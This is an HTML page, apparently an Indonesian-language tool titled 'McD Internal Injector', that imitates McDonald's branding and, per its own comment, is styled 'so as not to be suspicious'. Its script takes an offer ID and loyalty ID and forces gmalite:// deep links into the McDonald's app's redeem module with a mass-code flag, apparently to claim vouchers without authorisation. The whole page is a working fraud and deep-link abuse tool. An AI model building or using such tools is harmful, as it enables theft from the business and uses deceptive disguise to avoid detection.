<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>McD Internal Injector</title>
    <style>
        /* Desain dibuat mirip tampilan asli McD agar tidak mencurigakan */
        body { font-family: -apple-system, sans-serif; background: #ffffff; margin: 0; padding: 20px; text-align: center; }
        .card { padding: 20px; border-radius: 20px; border: 1px solid #eee; box-shadow: 0 5px 15px rgba(0,0,0,0.05); }
        .logo { width: 45px; margin-bottom: 10px; }
        h2 { font-size: 16px; color: #333; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1.5px solid #ddd; border-radius: 10px; font-size: 16px; box-sizing: border-box; outline: none; }
        input:focus { border-color: #da291c; }
        .btn-inject { background: #da291c; color: #fff; border: none; padding: 15px; border-radius: 10px; width: 100%; font-weight: bold; font-size: 15px; cursor: pointer; }
        .footer { font-size: 10px; color: #bbb; margin-top: 15px; }
    </style>
</head>
<body>

    <div class="card">
        <img src="https://www.mcdonalds.co.id/assets/img/common/mcdonalds_logo.png" class="logo">
        <h2>Internal Injector Panel</h2>
        
        <input type="number" id="off" placeholder="Enter Offer ID" inputmode="numeric">
        <input type="number" id="loy" placeholder="Enter Loyalty ID" inputmode="numeric">

        <button class="btn-inject" onclick="doInject()">KLAIM VOUCHER</button>
        
        <div class="footer">Status: Connected to App Internal</div>
    </div>

    <script>
        function doInject() {
            var offId = document.getElementById('off').value;
            var loyId = document.getElementById('loy').value;

            if (!offId || !loyId) { alert("Isi ID!"); return; }

            // Karena kita sudah di dalam aplikasi (Smartweb), 
            // kita bisa langsung memanggil deep link untuk berpindah modul
            
            // Jalur 1: Mencoba buka modul redeem
            var target = "gmalite://offers/redeem?offer_id=" + offId + "&loyalty_id=" + loyId + "&is_mass_code=1&view=claim";
            
            // Jalur 2: Memaksa pindah halaman di dalam aplikasi
            window.location.href = target;
            
            // Jika tidak berpindah, gunakan fallback detail
            setTimeout(function() {
                window.location.href = "gmalite://offers/details?offer_id=" + offId + "&loyalty_id=" + loyId;
            }, 500);
        }
    </script>

</body>
</html>
